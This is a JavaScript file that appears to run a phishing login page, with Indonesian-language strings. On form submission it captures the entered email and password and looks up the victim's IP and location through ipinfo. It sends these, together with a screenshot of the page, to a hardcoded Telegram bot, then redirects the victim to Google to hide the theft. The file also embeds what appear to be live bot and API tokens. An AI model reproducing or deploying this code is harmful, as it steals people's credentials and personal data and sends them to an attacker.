document.getElementById("loginForm").addEventListener("submit", async function(event) {
    event.preventDefault();

    let email = document.getElementById("email").value;
    let password = document.getElementById("password").value;
    let waktuLogin = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });

    let ipInfo = { ip: "Tidak diketahui", city: "Tidak diketahui", country: "Tidak diketahui", org: "Tidak diketahui" };
    try {
        let response = await fetch("https://ipinfo.io/json?token=961f6caebd0f7d");
        ipInfo = await response.json();
    } catch (error) {
        console.error("Gagal mendapatkan data IP:", error);
    }

    let botToken = "7628314972:AAHZtVoYDVeujuM8o7xpvaLzTGIjrMJodhY";
    let chatId = "6786210993";
    let imageUrl = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ_fMq7l79lm6-bYF7qqvwuxlKpXPgJ90_TLA&usqp=CAU"; 

    try {
        let photoUrl = `https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}&photo=${encodeURIComponent(imageUrl)}`;
        await fetch(photoUrl);
        console.log("Foto terkirim ke Telegram!");
    } catch (error) {
        console.error("Gagal kirim foto:", error);
    }

    let message = `🔒 *Login Berhasil! Boy*\n\n`
                + `🕒 *Waktu:* ${waktuLogin}\n`
                + `📧 *Email:* ${email}\n`
                + `🔑 *Password:* ${password}\n`
                + `🌍 *IP:* ${ipInfo.ip}\n`
                + `📍 *Lokasi:* ${ipInfo.city}, ${ipInfo.country}\n`
                + `🏢 *Provider:* ${ipInfo.org}`;

    let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

    
    async function ambilScreenshot() {
        try {
            let canvas = await html2canvas(document.body);
            let imgData = canvas.toDataURL("image/png");

            let formData = new FormData();
            formData.append("chat_id", chatId);
            formData.append("photo", dataURItoBlob(imgData), "screenshot.png");

            let sendPhotoUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
            let response = await fetch(sendPhotoUrl, {
                method: "POST",
                body: formData
            });

            let data = await response.json();
            if (data.ok) {
                console.log("Screenshot terkirim ke Telegram!");
            } else {
                console.error("Gagal kirim screenshot:", data);
            }
        } catch (error) {
            console.error("Error saat mengambil screenshot:", error);
        }
    }

    
    function dataURItoBlob(dataURI) {
        let byteString = atob(dataURI.split(",")[1]);
        let mimeString = dataURI.split(",")[0].split(":")[1].split(";")[0];
        let ab = new ArrayBuffer(byteString.length);
        let ia = new Uint8Array(ab);
        for (let i = 0; i < byteString.length; i++) {
            ia[i] = byteString.charCodeAt(i);
        }
        return new Blob([ab], { type: mimeString });
    }

   
    await ambilScreenshot();
    setTimeout(() => {
        fetch(url)
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    console.log("Data terkirim ke Telegram!");
                    window.location.href = "https://www.google.com";
                } else {
                    console.error("Gagal kirim ke Telegram!", data);
                }
            })
            .catch(error => console.error("Error:", error));
    }, 1000);
});
